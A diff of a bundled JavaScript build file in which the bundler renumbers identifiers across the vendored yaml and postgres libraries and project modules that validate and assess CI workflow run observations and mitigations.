@@ -58,12 +58,12 @@ var require_identity = __commonJS({
     var SCALAR = /* @__PURE__ */ Symbol.for("yaml.scalar");
     var SEQ = /* @__PURE__ */ Symbol.for("yaml.seq");
     var NODE_TYPE = /* @__PURE__ */ Symbol.for("yaml.node.type");
-    var isAlias5 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === ALIAS;
+    var isAlias6 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === ALIAS;
     var isDocument = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === DOC;
-    var isMap10 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === MAP;
+    var isMap11 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === MAP;
     var isPair6 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === PAIR;
-    var isScalar14 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SCALAR;
-    var isSeq7 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SEQ;
+    var isScalar15 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SCALAR;
+    var isSeq8 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SEQ;
     function isCollection(node) {
       if (node && typeof node === "object")
         switch (node[NODE_TYPE]) {
@@ -84,7 +84,7 @@ var require_identity = __commonJS({
         }
       return false;
     }
-    var hasAnchor = (node) => (isScalar14(node) || isCollection(node)) && !!node.anchor;
+    var hasAnchor = (node) => (isScalar15(node) || isCollection(node)) && !!node.anchor;
     exports.ALIAS = ALIAS;
     exports.DOC = DOC;
     exports.MAP = MAP;
@@ -93,14 +93,14 @@ var require_identity = __commonJS({
     exports.SCALAR = SCALAR;
     exports.SEQ = SEQ;
     exports.hasAnchor = hasAnchor;
-    exports.isAlias = isAlias5;
+    exports.isAlias = isAlias6;
     exports.isCollection = isCollection;
     exports.isDocument = isDocument;
-    exports.isMap = isMap10;
+    exports.isMap = isMap11;
     exports.isNode = isNode;
     exports.isPair = isPair6;
-    exports.isScalar = isScalar14;
-    exports.isSeq = isSeq7;
+    exports.isScalar = isScalar15;
+    exports.isSeq = isSeq8;
   }
 });
 
@@ -112,7 +112,7 @@ var require_visit = __commonJS({
     var BREAK = /* @__PURE__ */ Symbol("break visit");
     var SKIP2 = /* @__PURE__ */ Symbol("skip children");
     var REMOVE = /* @__PURE__ */ Symbol("remove node");
-    function visit3(node, visitor) {
+    function visit4(node, visitor) {
       const visitor_ = initVisitor(visitor);
       if (identity3.isDocument(node)) {
         const cd = visit_(null, node.contents, visitor_, Object.freeze([node]));
@@ -121,9 +121,9 @@ var require_visit = __commonJS({
       } else
         visit_(null, node, visitor_, Object.freeze([]));
     }
-    visit3.BREAK = BREAK;
-    visit3.SKIP = SKIP2;
-    visit3.REMOVE = REMOVE;
+    visit4.BREAK = BREAK;
+    visit4.SKIP = SKIP2;
+    visit4.REMOVE = REMOVE;
     function visit_(key2, node, visitor, path) {
       const ctrl = callVisitor(key2, node, visitor, path);
       if (identity3.isNode(ctrl) || identity3.isPair(ctrl)) {
@@ -257,7 +257,7 @@ var require_visit = __commonJS({
         throw new Error(`Cannot replace node with ${pt} parent`);
       }
     }
-    exports.visit = visit3;
+    exports.visit = visit4;
     exports.visitAsync = visitAsync;
   }
 });
@@ -267,7 +267,7 @@ var require_directives = __commonJS({
   "node_modules/yaml/dist/doc/directives.js"(exports) {
     "use strict";
     var identity3 = require_identity();
-    var visit3 = require_visit();
+    var visit4 = require_visit();
     var escapeChars = {
       "!": "%21",
       ",": "%2C",
@@ -411,7 +411,7 @@ var require_directives = __commonJS({
         let tagNames;
         if (doc && tagEntries.length > 0 && identity3.isNode(doc.contents)) {
           const tags = {};
-          visit3.visit(doc.contents, (_key, node) => {
+          visit4.visit(doc.contents, (_key, node) => {
             if (identity3.isNode(node) && node.tag)
               tags[node.tag] = true;
           });
@@ -438,7 +438,7 @@ var require_anchors = __commonJS({
   "node_modules/yaml/dist/doc/anchors.js"(exports) {
     "use strict";
     var identity3 = require_identity();
-    var visit3 = require_visit();
+    var visit4 = require_visit();
     function anchorIsValid(anchor) {
       if (/[\x00-\x19\s,[\]{}]/.test(anchor)) {
         const sa = JSON.stringify(anchor);
@@ -449,7 +449,7 @@ var require_anchors = __commonJS({
     }
     function anchorNames(root) {
       const anchors = /* @__PURE__ */ new Set();
-      visit3.visit(root, {
+      visit4.visit(root, {
         Value(_key, node) {
           if (node.anchor)
             anchors.add(node.anchor);
@@ -629,7 +629,7 @@ var require_Alias = __commonJS({
   "node_modules/yaml/dist/nodes/Alias.js"(exports) {
     "use strict";
     var anchors = require_anchors();
-    var visit3 = require_visit();
+    var visit4 = require_visit();
     var identity3 = require_identity();
     var Node = require_Node();
     var toJS2 = require_toJS();
@@ -655,7 +655,7 @@ var require_Alias = __commonJS({
           nodes = ctx.aliasResolveCache;
         } else {
           nodes = [];
-          visit3.visit(doc, {
+          visit4.visit(doc, {
             Node: (_key, node) => {
               if (identity3.isAlias(node) || identity3.hasAnchor(node))
                 nodes.push(node);
@@ -1014,14 +1014,14 @@ var require_foldFlowLines = __commonJS({
     var FOLD_FLOW = "flow";
     var FOLD_BLOCK = "block";
     var FOLD_QUOTED = "quoted";
-    function foldFlowLines(text6, indent, mode = "flow", { indentAtStart, lineWidth = 80, minContentWidth = 20, onFold, onOverflow } = {}) {
+    function foldFlowLines(text7, indent, mode = "flow", { indentAtStart, lineWidth = 80, minContentWidth = 20, onFold, onOverflow } = {}) {
       if (!lineWidth || lineWidth < 0)
-        return text6;
+        return text7;
       if (lineWidth < minContentWidth)
         minContentWidth = 0;
       const endStep = Math.max(1 + minContentWidth, 1 + lineWidth - indent.length);
-      if (text6.length <= endStep)
-        return text6;
+      if (text7.length <= endStep)
+        return text7;
       const folds = [];
       const escapedFolds = {};
       let end = lineWidth - indent.length;
@@ -1038,14 +1038,14 @@ var require_foldFlowLines = __commonJS({
       let escStart = -1;
       let escEnd = -1;
       if (mode === FOLD_BLOCK) {
-        i = consumeMoreIndentedLines(text6, i, indent.length);
+        i = consumeMoreIndentedLines(text7, i, indent.length);
         if (i !== -1)
           end = i + endStep;
       }
-      for (let ch; ch = text6[i += 1]; ) {
+      for (let ch; ch = text7[i += 1]; ) {
         if (mode === FOLD_QUOTED && ch === "\\") {
           escStart = i;
-          switch (text6[i + 1]) {
+          switch (text7[i + 1]) {
             case "x":
               i += 3;
               break;
@@ -1062,12 +1062,12 @@ var require_foldFlowLines = __commonJS({
         }
         if (ch === "\n") {
           if (mode === FOLD_BLOCK)
-            i = consumeMoreIndentedLines(text6, i, indent.length);
+            i = consumeMoreIndentedLines(text7, i, indent.length);
           end = i + indent.length + endStep;
           split3 = void 0;
         } else {
           if (ch === " " && prev && prev !== " " && prev !== "\n" && prev !== "	") {
-            const next = text6[i + 1];
+            const next = text7[i + 1];
             if (next && next !== " " && next !== "\n" && next !== "	")
               split3 = i;
           }
@@ -1079,12 +1079,12 @@ var require_foldFlowLines = __commonJS({
             } else if (mode === FOLD_QUOTED) {
               while (prev === " " || prev === "	") {
                 prev = ch;
-                ch = text6[i += 1];
+                ch = text7[i += 1];
                 overflow = true;
               }
               const j = i > escEnd + 1 ? i - 2 : escStart - 1;
               if (escapedFolds[j])
-                return text6;
+                return text7;
               folds.push(j);
               escapedFolds[j] = true;
               end = j + endStep;
@@ -1099,39 +1099,39 @@ var require_foldFlowLines = __commonJS({
       if (overflow && onOverflow)
         onOverflow();
       if (folds.length === 0)
-        return text6;
+        return text7;
       if (onFold)
         onFold();
-      let res = text6.slice(0, folds[0]);
+      let res = text7.slice(0, folds[0]);
       for (let i2 = 0; i2 < folds.length; ++i2) {
         const fold = folds[i2];
-        const end2 = folds[i2 + 1] || text6.length;
+        const end2 = folds[i2 + 1] || text7.length;
         if (fold === 0)
           res = `
-${indent}${text6.slice(0, end2)}`;
+${indent}${text7.slice(0, end2)}`;
         else {
           if (mode === FOLD_QUOTED && escapedFolds[fold])
-            res += `${text6[fold]}\\`;
+            res += `${text7[fold]}\\`;
           res += `
-${indent}${text6.slice(fold + 1, end2)}`;
+${indent}${text7.slice(fold + 1, end2)}`;
         }
       }
       return res;
     }
-    function consumeMoreIndentedLines(text6, i, indent) {
+    function consumeMoreIndentedLines(text7, i, indent) {
       let end = i;
       let start2 = i + 1;
-      let ch = text6[start2];
+      let ch = text7[start2];
       while (ch === " " || ch === "	") {
         if (i < start2 + indent) {
-          ch = text6[++i];
+          ch = text7[++i];
         } else {
           do {
-            ch = text6[++i];
+            ch = text7[++i];
           } while (ch && ch !== "\n");
           end = i;
           start2 = i + 1;
-          ch = text6[start2];
+          ch = text7[start2];
         }
       }
       return end;
@@ -2329,7 +2329,7 @@ var require_string = __commonJS({
   "node_modules/yaml/dist/schema/common/string.js"(exports) {
     "use strict";
     var stringifyString = require_stringifyString();
-    var string3 = {
+    var string4 = {
       identify: (value2) => typeof value2 === "string",
       default: true,
       tag: "tag:yaml.org,2002:str",
@@ -2339,7 +2339,7 @@ var require_string = __commonJS({
         return stringifyString.stringifyString(item, ctx, onComment, onChompKeep);
       }
     };
-    exports.string = string3;
+    exports.string = string4;
   }
 });
 
@@ -2510,14 +2510,14 @@ var require_schema = __commonJS({
     var map = require_map();
     var _null = require_null();
     var seq = require_seq();
-    var string3 = require_string();
+    var string4 = require_string();
     var bool2 = require_bool();
     var float = require_float();
     var int = require_int();
     var schema = [
       map.map,
       seq.seq,
-      string3.string,
+      string4.string,
       _null.nullTag,
       bool2.boolTag,
       int.intOct,
@@ -3164,7 +3164,7 @@ var require_schema3 = __commonJS({
     var map = require_map();
     var _null = require_null();
     var seq = require_seq();
-    var string3 = require_string();
+    var string4 = require_string();
     var binary = require_binary();
     var bool2 = require_bool2();
     var float = require_float2();
@@ -3177,7 +3177,7 @@ var require_schema3 = __commonJS({
     var schema = [
       map.map,
       seq.seq,
-      string3.string,
+      string4.string,
       _null.nullTag,
       bool2.trueTag,
       bool2.falseTag,
@@ -3208,7 +3208,7 @@ var require_tags = __commonJS({
     var map = require_map();
     var _null = require_null();
     var seq = require_seq();
-    var string3 = require_string();
+    var string4 = require_string();
     var bool2 = require_bool();
     var float = require_float();
     var int = require_int();
@@ -3223,7 +3223,7 @@ var require_tags = __commonJS({
     var timestamp4 = require_timestamp();
     var schemas = /* @__PURE__ */ new Map([
       ["core", schema.schema],
-      ["failsafe", [map.map, seq.seq, string3.string]],
+      ["failsafe", [map.map, seq.seq, string4.string]],
       ["json", schema$1.schema],
       ["yaml11", schema$2.schema],
       ["yaml-1.1", schema$2.schema]
@@ -3302,7 +3302,7 @@ var require_Schema = __commonJS({
     var identity3 = require_identity();
     var map = require_map();
     var seq = require_seq();
-    var string3 = require_string();
+    var string4 = require_string();
     var tags = require_tags();
     var sortMapEntriesByKey = (a, b) => a.key < b.key ? -1 : a.key > b.key ? 1 : 0;
     var Schema = class _Schema {
@@ -3313,7 +3313,7 @@ var require_Schema = __commonJS({
         this.tags = tags.getTags(customTags, this.name, merge3);
         this.toStringOptions = toStringDefaults ?? null;
         Object.defineProperty(this, identity3.MAP, { value: map.map });
-        Object.defineProperty(this, identity3.SCALAR, { value: string3.string });
+        Object.defineProperty(this, identity3.SCALAR, { value: string4.string });
         Object.defineProperty(this, identity3.SEQ, { value: seq.seq });
         this.sortMapEntries = typeof sortMapEntries === "function" ? sortMapEntries : sortMapEntries === true ? sortMapEntriesByKey : null;
       }
@@ -4208,9 +4208,9 @@ var require_resolve_flow_collection = __commonJS({
     var blockMsg = "Block collections are not allowed within flow collections";
     var isBlock = (token) => token && (token.type === "block-map" || token.type === "block-seq");
     function resolveFlowCollection({ composeNode, composeEmptyNode }, ctx, fc, onError, tag) {
-      const isMap10 = fc.start.source === "{";
-      const fcName = isMap10 ? "flow map" : "flow sequence";
-      const NodeClass = tag?.nodeClass ?? (isMap10 ? YAMLMap.YAMLMap : YAMLSeq.YAMLSeq);
+      const isMap11 = fc.start.source === "{";
+      const fcName = isMap11 ? "flow map" : "flow sequence";
+      const NodeClass = tag?.nodeClass ?? (isMap11 ? YAMLMap.YAMLMap : YAMLSeq.YAMLSeq);
       const coll = new NodeClass(ctx.schema);
       coll.flow = true;
       const atRoot = ctx.atRoot;
@@ -4246,7 +4246,7 @@ var require_resolve_flow_collection = __commonJS({
             offset = props.end;
             continue;
           }
-          if (!isMap10 && ctx.options.strict && utilContainsNewline.containsNewline(key2))
+          if (!isMap11 && ctx.options.strict && utilContainsNewline.containsNewline(key2))
             onError(
               key2,
               // checked by containsNewline()
@@ -4286,7 +4286,7 @@ var require_resolve_flow_collection = __commonJS({
             }
           }
         }
-        if (!isMap10 && !sep3 && !props.found) {
+        if (!isMap11 && !sep3 && !props.found) {
           const valueNode = value2 ? composeNode(ctx, value2, props, onError) : composeEmptyNode(ctx, props.end, sep3, null, props, onError);
           coll.items.push(valueNode);
           offset = valueNode.range[2];
@@ -4309,7 +4309,7 @@ var require_resolve_flow_collection = __commonJS({
             startOnNewline: false
           });
           if (valueProps.found) {
-            if (!isMap10 && !props.found && ctx.options.strict) {
+            if (!isMap11 && !props.found && ctx.options.strict) {
               if (sep3)
                 for (const st of sep3) {
                   if (st === valueProps.found)
@@ -4341,7 +4341,7 @@ var require_resolve_flow_collection = __commonJS({
           const pair = new Pair.Pair(keyNode, valueNode);
           if (ctx.options.keepSourceTokens)
             pair.srcToken = collItem;
-          if (isMap10) {
+          if (isMap11) {
             const map = coll;
             if (utilMapIncludes.mapIncludes(ctx, map.items, keyNode))
               onError(keyStart, "DUPLICATE_KEY", "Map keys must be unique");
@@ -4357,7 +4357,7 @@ var require_resolve_flow_collection = __commonJS({
           offset = valueNode ? valueNode.range[2] : valueProps.end;
         }
       }
-      const expectedEnd = isMap10 ? "}" : "]";
+      const expectedEnd = isMap11 ? "}" : "]";
       const [ce, ...ee] = fc.end;
       let cePos = offset;
       if (ce?.source === expectedEnd)
@@ -5577,15 +5577,15 @@ var require_cst_visit = __commonJS({
     var BREAK = /* @__PURE__ */ Symbol("break visit");
     var SKIP2 = /* @__PURE__ */ Symbol("skip children");
     var REMOVE = /* @__PURE__ */ Symbol("remove item");
-    function visit3(cst, visitor) {
+    function visit4(cst, visitor) {
       if ("type" in cst && cst.type === "document")
         cst = { start: cst.start, value: cst.value };
       _visit(Object.freeze([]), cst, visitor);
     }
-    visit3.BREAK = BREAK;
-    visit3.SKIP = SKIP2;
-    visit3.REMOVE = REMOVE;
-    visit3.itemAtPath = (cst, path) => {
+    visit4.BREAK = BREAK;
+    visit4.SKIP = SKIP2;
+    visit4.REMOVE = REMOVE;
+    visit4.itemAtPath = (cst, path) => {
       let item = cst;
       for (const [field3, index] of path) {
         const tok = item?.[field3];
@@ -5596,8 +5596,8 @@ var require_cst_visit = __commonJS({
       }
       return item;
     };
-    visit3.parentCollection = (cst, path) => {
-      const parent = visit3.itemAtPath(cst, path.slice(0, -1));
+    visit4.parentCollection = (cst, path) => {
+      const parent = visit4.itemAtPath(cst, path.slice(0, -1));
       const field3 = path[path.length - 1][0];
       const coll = parent?.[field3];
       if (coll && "items" in coll)
@@ -5628,7 +5628,7 @@ var require_cst_visit = __commonJS({
       }
       return typeof ctrl === "function" ? ctrl(item, path) : ctrl;
     }
-    exports.visit = visit3;
+    exports.visit = visit4;
   }
 });
 
@@ -5644,7 +5644,7 @@ var require_cst = __commonJS({
     var FLOW_END = "";
     var SCALAR = "";
     var isCollection = (token) => !!token && "items" in token;
-    var isScalar14 = (token) => !!token && (token.type === "scalar" || token.type === "single-quoted-scalar" || token.type === "double-quoted-scalar" || token.type === "block-scalar");
+    var isScalar15 = (token) => !!token && (token.type === "scalar" || token.type === "single-quoted-scalar" || token.type === "double-quoted-scalar" || token.type === "block-scalar");
     function prettyToken(token) {
       switch (token) {
         case BOM:
@@ -5728,7 +5728,7 @@ var require_cst = __commonJS({
     exports.FLOW_END = FLOW_END;
     exports.SCALAR = SCALAR;
     exports.isCollection = isCollection;
-    exports.isScalar = isScalar14;
+    exports.isScalar = isScalar15;
     exports.prettyToken = prettyToken;
     exports.tokenType = tokenType;
   }
@@ -7258,7 +7258,7 @@ var require_public_api = __commonJS({
         return docs;
       return Object.assign([], { empty: true }, composer$1.streamInfo());
     }
-    function parseDocument3(source, options = {}) {
+    function parseDocument4(source, options = {}) {
       const { lineCounter: lineCounter2, prettyErrors } = parseOptions2(options);
       const parser$1 = new parser.Parser(lineCounter2?.addNewLine);
       const composer$1 = new composer.Composer(options);
@@ -7284,7 +7284,7 @@ var require_public_api = __commonJS({
       } else if (options === void 0 && reviver && typeof reviver === "object") {
         options = reviver;
       }
-      const doc = parseDocument3(src, options);
+      const doc = parseDocument4(src, options);
       if (!doc)
         return null;
       doc.warnings.forEach((warning) => log.warn(doc.options.logLevel, warning));
@@ -7320,7 +7320,7 @@ var require_public_api = __commonJS({
     }
     exports.parse = parse12;
     exports.parseAllDocuments = parseAllDocuments2;
-    exports.parseDocument = parseDocument3;
+    exports.parseDocument = parseDocument4;
     exports.stringify = stringify4;
   }
 });
@@ -7344,7 +7344,7 @@ var require_dist = __commonJS({
     var lineCounter = require_line_counter();
     var parser = require_parser();
     var publicApi = require_public_api();
-    var visit3 = require_visit();
+    var visit4 = require_visit();
     exports.Composer = composer.Composer;
     exports.Document = Document.Document;
     exports.Schema = Schema.Schema;
@@ -7372,8 +7372,8 @@ var require_dist = __commonJS({
     exports.parseAllDocuments = publicApi.parseAllDocuments;
     exports.parseDocument = publicApi.parseDocument;
     exports.stringify = publicApi.stringify;
-    exports.visit = visit3.visit;
-    exports.visitAsync = visit3.visitAsync;
+    exports.visit = visit4.visit;
+    exports.visitAsync = visit4.visitAsync;
   }
 });
 
@@ -7455,7 +7455,7 @@ var init_stats = __esm({
 });
 
 // src/knowledge/identity.ts
-import { createHash as createHash3 } from "node:crypto";
+import { createHash as createHash4 } from "node:crypto";
 function canonical(value2) {
   if (Array.isArray(value2)) return value2.map(canonical);
   if (typeof value2 === "object" && value2 !== null) {
@@ -7487,7 +7487,7 @@ var hash3, identity, inventoryPolicyDigest;
 var init_identity = __esm({
   "src/knowledge/identity.ts"() {
     "use strict";
-    hash3 = (value2) => createHash3("sha256").update(value2).digest("hex");
+    hash3 = (value2) => createHash4("sha256").update(value2).digest("hex");
     identity = (value2) => hash3(JSON.stringify(canonical(value2)));
     inventoryPolicyDigest = (config) => identity(["knowledge-inventory-v2", [...new Set(config.ignorePaths)].sort(), config.limits]);
   }
@@ -7529,7 +7529,7 @@ var init_history = __esm({
 });
 
 // src/telemetry/context.ts
-import { createHash as createHash4 } from "node:crypto";
+import { createHash as createHash5 } from "node:crypto";
 function comparisonProblem(snapshot) {
   if (snapshot.runAttempt !== 1) return "Reruns may execute only part of the workload or reuse warmed state.";
   if (snapshot.conclusion !== "success") return "The workflow did not complete successfully.";
@@ -7554,7 +7554,7 @@ function jobComparisonContext(job) {
 function comparisonKey(snapshot) {
   if (comparisonProblem(snapshot)) return void 0;
   const jobs = snapshot.jobs.map(jobComparisonContext).sort();
-  return createHash4("sha256").update(JSON.stringify([
+  return createHash5("sha256").update(JSON.stringify([
     "workload-comparison-v1",
     snapshot.owner,
     snapshot.repo,
@@ -7597,19 +7597,19 @@ function runtimeFacts(run4) {
 function runtimeFactsIdentity(run4) {
   return identity(["knowledge-runtime-facts-v1", runtimeFacts(run4)]);
 }
-function runObservationIdentity(observation) {
-  return identity(["knowledge-run-observation-v1", observation.version, observation.repository, observation.source, runtimeFacts(observation.run)]);
+function runObservationIdentity(observation2) {
+  return identity(["knowledge-run-observation-v1", observation2.version, observation2.repository, observation2.source, runtimeFacts(observation2.run)]);
 }
-function validateRunObservation(observation) {
-  validateScope(observation.repository);
-  validateRevision(observation.run.headSha);
-  if (observation.version !== 1 || observation.id !== runObservationIdentity(observation)) throw new Error("Run observation identity does not match its evidence");
-  const run4 = observation.run;
+function validateRunObservation(observation2) {
+  validateScope(observation2.repository);
+  validateRevision(observation2.run.headSha);
+  if (observation2.version !== 1 || observation2.id !== runObservationIdentity(observation2)) throw new Error("Run observation identity does not match its evidence");
+  const run4 = observation2.run;
   if (run4.branch !== null && (typeof run4.branch !== "string" || !run4.branch)) throw new Error("Run evidence branch must be a nonempty string or null");
   positive(run4.runId, "Run ID");
   positive(run4.runAttempt, "Run attempt");
   positive(run4.workflowId, "Workflow ID");
-  [observation.observedAt, run4.createdAt, run4.startedAt, run4.completedAt].forEach(timestamp);
+  [observation2.observedAt, run4.createdAt, run4.startedAt, run4.completedAt].forEach(timestamp);
   duration(run4.durationMs);
   if (run4.queueMs !== null) duration(run4.queueMs);
   if (run4.provenance) timestamp(run4.provenance.collectedAt);
@@ -7628,18 +7628,18 @@ function validateRunObservation(observation) {
       duration(step.durationMs);
     }
   }
-  if (observation.source.status === "linked") {
-    if (!/^[a-f0-9]{64}$/.test(observation.source.snapshotId)) throw new Error("Invalid project context identity");
-  } else if (observation.source.status !== "unavailable" || observation.source.reason !== "revision-unavailable") {
+  if (observation2.source.status === "linked") {
+    if (!/^[a-f0-9]{64}$/.test(observation2.source.snapshotId)) throw new Error("Invalid project context identity");
+  } else if (observation2.source.status !== "unavailable" || observation2.source.reason !== "revision-unavailable") {
     throw new Error("Unsupported project context status");
   }
 }
-function validateRunSource(observation, source) {
-  if (observation.source.status === "unavailable") {
+function validateRunSource(observation2, source) {
+  if (observation2.source.status === "unavailable") {
     if (source) throw new Error("Unavailable run context cannot include a source snapshot");
     return;
   }
-  if (!source || source.id !== observation.source.snapshotId || source.revision !== observation.run.headSha || source.repository.host !== observation.repository.host || source.repository.repositoryId !== observation.repository.repositoryId) {
+  if (!source || source.id !== observation2.source.snapshotId || source.revision !== observation2.run.headSha || source.repository.host !== observation2.repository.host || source.repository.repositoryId !== observation2.repository.repositoryId) {
     throw new Error("Run context must reference the same repository and source revision");
   }
 }
@@ -7655,9 +7655,9 @@ function validateRunObservationQuery(query2) {
 }
 function createRunObservation(repository, run4, source, now2 = /* @__PURE__ */ new Date()) {
   const value2 = structuredClone({ version: 1, repository, run: run4, source, observedAt: now2.toISOString() });
-  const observation = { ...value2, id: runObservationIdentity(value2) };
-  validateRunObservation(observation);
-  return observation;
+  const observation2 = { ...value2, id: runObservationIdentity(value2) };
+  validateRunObservation(observation2);
+  return observation2;
 }
 var positive, timestamp, duration;
 var init_run_observation = __esm({
@@ -7905,20 +7905,20 @@ function assessMitigation(input2) {
   if (control.some(({ run: run4 }) => Date.parse(run4.completedAt) > appliedAt) || treatment.some(({ run: run4 }) => Date.parse(run4.startedAt) < appliedAt)) {
     throw new Error("Mitigation control and treatment observations must bracket the application");
   }
-  const metricValue = (observation) => {
+  const metricValue = (observation2) => {
     if (input2.metric.kind === "workflow-duration") {
       if (input2.metric.key !== "workflow") throw new Error("Workflow duration metric key must be 'workflow'");
-      return observation.run.durationMs;
+      return observation2.run.durationMs;
     }
     if (input2.metric.kind !== "job-duration") throw new Error("Mitigation duration metric is invalid");
-    const jobs = observation.run.jobs.filter((job) => jobComparisonContext(job) === input2.metric.key);
+    const jobs = observation2.run.jobs.filter((job) => jobComparisonContext(job) === input2.metric.key);
     if (jobs.length !== 1) throw new Error("Mitigation job metric must identify exactly one comparable job");
     return jobs[0].durationMs;
   };
   const before = control.map(metricValue);
   const after2 = treatment.map(metricValue);
   const evaluatedAt = Date.parse(input2.evaluatedAt ?? (/* @__PURE__ */ new Date()).toISOString());
-  if ([...control, ...treatment].some((observation) => Date.parse(observation.run.completedAt) > evaluatedAt)) {
+  if ([...control, ...treatment].some((observation2) => Date.parse(observation2.run.completedAt) > evaluatedAt)) {
     throw new Error("Mitigation evaluation must follow every measured run");
   }
   const alpha = input2.alpha ?? 0.05;
@@ -7977,25 +7977,25 @@ function verifyMitigationEvaluation(application, evaluation, events, observation
     throw new Error("Measured mitigation evaluation requires an applied state at its evaluation time");
   }
   if (evaluation.outcome === "unknown") return;
-  const observationById = new Map(observations.map((observation) => [observation.id, observation]));
+  const observationById = new Map(observations.map((observation2) => [observation2.id, observation2]));
   const control = evaluation.controlObservationIds.map((id) => observationById.get(id));
   const treatment = evaluation.treatmentObservationIds.map((id) => observationById.get(id));
-  if (control.some((observation) => !observation) || treatment.some((observation) => !observation)) {
+  if (control.some((observation2) => !observation2) || treatment.some((observation2) => !observation2)) {
     throw new Error("Mitigation evaluation references unavailable run evidence");
   }
   const selected = [...control, ...treatment];
   const selectedRunIds = new Set(selected.map(({ run: run4 }) => run4.runId));
   if (selectedRunIds.size !== selected.length) throw new Error("Mitigation evaluation samples must use distinct logical runs");
   const runtime = /* @__PURE__ */ new Map();
-  for (const observation of observations) {
-    if (!selectedRunIds.has(observation.run.runId)) continue;
-    validateRunObservation(observation);
-    if (observation.repository.host !== evaluation.target.host || observation.repository.repositoryId !== evaluation.target.repositoryId) throw new Error("Mitigation run evidence does not match its indexed scope");
-    if (observation.run.runAttempt !== 1) throw new Error("Mitigation evaluation excludes logical runs with retries");
-    const identity3 = runtimeFactsIdentity(observation.run);
-    const prior = runtime.get(observation.run.runId);
+  for (const observation2 of observations) {
+    if (!selectedRunIds.has(observation2.run.runId)) continue;
+    validateRunObservation(observation2);
+    if (observation2.repository.host !== evaluation.target.host || observation2.repository.repositoryId !== evaluation.target.repositoryId) throw new Error("Mitigation run evidence does not match its indexed scope");
+    if (observation2.run.runAttempt !== 1) throw new Error("Mitigation evaluation excludes logical runs with retries");
+    const identity3 = runtimeFactsIdentity(observation2.run);
+    const prior = runtime.get(observation2.run.runId);
     if (prior !== void 0 && prior !== identity3) throw new Error("Mitigation evaluation excludes conflicting run corrections");
-    runtime.set(observation.run.runId, identity3);
+    runtime.set(observation2.run.runId, identity3);
   }
   const expected = assessMitigation({
     application,
@@ -8014,19 +8014,19 @@ function verifyMitigationEvaluation(application, evaluation, events, observation
 function uniqueRuns(observations, side, application) {
   const runs = /* @__PURE__ */ new Set();
   const facts = /* @__PURE__ */ new Map();
-  for (const observation of observations) {
-    validateRunObservation(observation);
-    if (observation.repository.host !== application.target.host || observation.repository.repositoryId !== application.target.repositoryId) {
+  for (const observation2 of observations) {
+    validateRunObservation(observation2);
+    if (observation2.repository.host !== application.target.host || observation2.repository.repositoryId !== application.target.repositoryId) {
       throw new Error("Mitigation assessment evidence crosses repository scope");
     }
-    if (runs.has(observation.run.runId)) throw new Error(`Mitigation ${side} samples must use distinct logical runs`);
-    runs.add(observation.run.runId);
-    if (observation.run.runAttempt !== 1) throw new Error("Mitigation assessment excludes workflow retries");
-    if (comparisonProblem(observation.run)) throw new Error("Mitigation assessment includes an ineligible workflow run");
-    const priorFacts = facts.get(observation.run.runId);
-    const currentFacts = runtimeFactsIdentity(observation.run);
+    if (runs.has(observation2.run.runId)) throw new Error(`Mitigation ${side} samples must use distinct logical runs`);
+    runs.add(observation2.run.runId);
+    if (observation2.run.runAttempt !== 1) throw new Error("Mitigation assessment excludes workflow retries");
+    if (comparisonProblem(observation2.run)) throw new Error("Mitigation assessment includes an ineligible workflow run");
+    const priorFacts = facts.get(observation2.run.runId);
+    const currentFacts = runtimeFactsIdentity(observation2.run);
     if (priorFacts !== void 0 && priorFacts !== currentFacts) throw new Error("Mitigation assessment includes conflicting run corrections");
-    facts.set(observation.run.runId, currentFacts);
+    facts.set(observation2.run.runId, currentFacts);
   }
   return [...observations].sort((a, b) => Date.parse(a.run.completedAt) - Date.parse(b.run.completedAt) || a.id.localeCompare(b.id));
 }
@@ -8152,19 +8152,19 @@ var init_errors = __esm({
 });
 
 // node_modules/postgres/src/types.js
-function integer(x, i, end) {
+function integer3(x, i, end) {
   const negative = x[i] === 45;
   let n = 0;
   for (negative && i++; i < end; i++)
     n = n * 10 + x[i] - 48;
   return negative ? -n : n;
 }
-function boolean(x, i) {
+function boolean2(x, i) {
   return x[i] === 116;
 }
 function Types(options = {}) {
   const parsers = {}, serializers = {}, elements = {}, undefinedValue = options.transform && options.transform.undefined;
-  Object.entries(arrays).forEach(([oid, array]) => elements[array] = [+oid, +oid === 603 ? ";" : ","]);
+  Object.entries(arrays).forEach(([oid, array2]) => elements[array2] = [+oid, +oid === 603 ? ";" : ","]);
   register(options.infer === false ? shapedTypes : types);
   Object.assign(parsers, dates);
   options.infer === false && (parsers[1114] = parseDate);
@@ -8176,7 +8176,7 @@ function Types(options = {}) {
     return typeof type === "string" ? oids[type] || 0 : type;
   }
   function decoder(oid, parse12) {
-    return parse12 === number && (oid === 21 || oid === 23 || oid === 26) ? integer : parse12 === bool && oid === 16 ? boolean : null;
+    return parse12 === number2 && (oid === 21 || oid === 23 || oid === 26) ? integer3 : parse12 === bool && oid === 16 ? boolean2 : null;
   }
   function register(xs) {
     Object.values(xs).forEach((x) => {
@@ -8208,7 +8208,7 @@ function Types(options = {}) {
       const [element, delimiter] = elements[oid], serialize = serializer(element);
       return serializers[oid] = (xs) => Array.isArray(xs) ? serializeArray(xs, serialize, delimiter, undefinedValue) : serialize(xs);
     }
-    return string;
+    return string2;
   }
   function load(run4) {
     return Promise.all([fetched(run4), named.length && names(run4)]);
@@ -8267,7 +8267,7 @@ function parseArray(x, parse12, delimiter = ",") {
     return xs;
   }
 }
-function serializeArray(xs, serialize = string, delimiter = ",", undefinedValue) {
+function serializeArray(xs, serialize = string2, delimiter = ",", undefinedValue) {
   return "{" + xs.map((x) => {
     const typed = x instanceof Parameter;
     typed && (x = x.value);
@@ -8328,14 +8328,14 @@ function createJsonTransform(fn) {
     return typeof x === "object" && x !== null && (column2.type === 114 || column2.type === 3802) ? Array.isArray(x) ? x.map((x2) => jsonTransform(x2, column2)) : Object.entries(x).reduce((acc, [k, v]) => Object.assign(acc, { [fn(k)]: jsonTransform(v, column2) }), {}) : x;
   };
 }
